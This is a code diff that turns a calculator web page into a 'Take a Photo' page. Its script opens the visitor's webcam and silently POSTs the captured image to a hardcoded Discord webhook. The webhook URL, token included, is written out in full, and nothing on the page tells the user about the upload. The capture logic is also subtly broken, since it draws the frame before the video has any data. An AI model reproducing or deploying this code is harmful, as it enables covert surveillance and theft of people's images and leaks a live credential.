@@ -1,59 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Calculator</title>
-
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ui-rainbow/2.2.0/ui-rainbow.min.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture</title>
 </head>
 <body>
-  <h1>Calculator</h1>
-  <input type="number" id="first-number" class="ui-input-rainbow-red">
-  <input type="number" id="second-number" class="ui-input-rainbow-orange">
-  <button id="add" class="ui-button-rainbow-yellow">Add</button>
-  <button id="subtract" class="ui-button-rainbow-green">Subtract</button>
-  <button id="multiply" class="ui-button-rainbow-blue">Multiply</button>
-  <button id="divide" class="ui-button-rainbow-purple">Divide</button>
-  <p id="result"></p>
+    <h1>Take a Photo</h1>
+    <button onclick="capturePhoto()">Capture Photo</button>
+    <img id="capturedImage" style="display: none;">
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ui-rainbow/2.2.0/ui-rainbow.min.js"></script>
-  <script>
-    const firstNumberInput = document.getElementById('first-number');
-    const secondNumberInput = document.getElementById('second-number');
-    const addButton = document.getElementById('add');
-    const subtractButton = document.getElementById('subtract');
-    const multiplyButton = document.getElementById('multiply');
-    const divideButton = document.getElementById('divide');
-    const resultParagraph = document.getElementById('result');
+    <script>
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-    addButton.addEventListener('click', () => {
-      const firstNumber = firstNumberInput.value;
-      const secondNumber = secondNumberInput.value;
-      const result = parseInt(firstNumber) + parseInt(secondNumber);
-      resultParagraph.textContent = result;
-    });
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
 
-    subtractButton.addEventListener('click', () => {
-      const firstNumber = firstNumberInput.value;
-      const secondNumber = secondNumberInput.value;
-      const result = parseInt(firstNumber) - parseInt(secondNumber);
-      resultParagraph.textContent = result;
-    });
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    multiplyButton.addEventListener('click', () => {
-      const firstNumber = firstNumberInput.value;
-      const secondNumber = secondNumberInput.value;
-      const result = parseInt(firstNumber) * parseInt(secondNumber);
-      resultParagraph.textContent = result;
-    });
+                    const capturedImage = canvas.toDataURL('image/jpeg');
+                    document.getElementById('capturedImage').src = capturedImage;
+                    document.getElementById('capturedImage').style.display = 'block';
 
-    divideButton.addEventListener('click', () => {
-      const firstNumber = firstNumberInput.value;
-      const secondNumber = secondNumberInput.value;
-      const result = parseInt(firstNumber) / parseInt(secondNumber);
-      resultParagraph.textContent = result;
-    });
-  </script>
+                    // Send captured image to webhook
+                    fetch('https://discord.com/api/webhooks/1179754334548922439/xGhYVQkS9YWjFrR9ca2r3g9kMR6mgtL98EInOXerbjbh0Q2GoI47B3Qi_mWmVgINd9uc', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            image: capturedImage
+                        })
+                    }).then(() => {
+                        console.log('Photo captured and sent successfully!');
+                    }).catch(error => {
+                        console.error('Error sending captured photo:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error capturing photo:', error);
+                });
+        }
+    </script>
 </body>
 </html>
